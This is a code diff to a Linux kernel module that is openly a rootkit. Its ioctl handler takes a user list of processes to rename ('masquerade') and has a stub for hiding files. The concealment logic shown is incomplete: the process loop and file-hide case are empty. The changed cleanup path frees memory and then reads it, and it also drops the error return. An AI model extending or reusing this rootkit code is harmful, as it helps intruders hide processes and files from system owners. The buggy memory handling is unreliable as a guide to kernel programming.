@@ -1,5 +1,4 @@
 #include <linux/sched.h>
-#include <linux/signal.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
@@ -64,38 +63,39 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		usr_rq = (struct masq_proc_req *)arg;
 		if (!req) {
 			ret = -ENOMEM;
-			goto masq_fail;
+			goto masq_break;
 		}
 		if (copy_from_user(req, usr_rq, n)) {
 			ret = -EFAULT;
-			goto masq_fail;
+			goto masq_break;
 		}
 
 		n = req->len * sizeof(struct masq_proc);
 		req->list = kmalloc(n, GFP_KERNEL);
 		if (!req->list) {
 			ret = -ENOMEM;
-			goto masq_fail;
+			goto masq_break;
 		}
 
 		n = sizeof(struct masq_proc);
 		for (i = 0; i < req->len; i++) {
 			if (copy_from_user(req->list+i, &usr_rq->list[i], n)) {
 				ret = -EFAULT;
-				goto masq_fail;
+				goto masq_break;
 			}
-			pr_info("req->list[%d]: %s", i, req->list[i]);
+			pr_info("req->list[%d]: %s, %s", i,
+					req->list[i].orig_name,
+					req->list[i].new_name);
 		}
 
 		for_each_process(p) {
 		}
-		break;
-masq_fail:
+masq_break:
 		if (req)
 			kfree(req);
 		if (req->list)
 			kfree(req->list);
-		return ret;
+		break;
 	case IOCTL_FILE_HIDE:
 		break;
 	default:
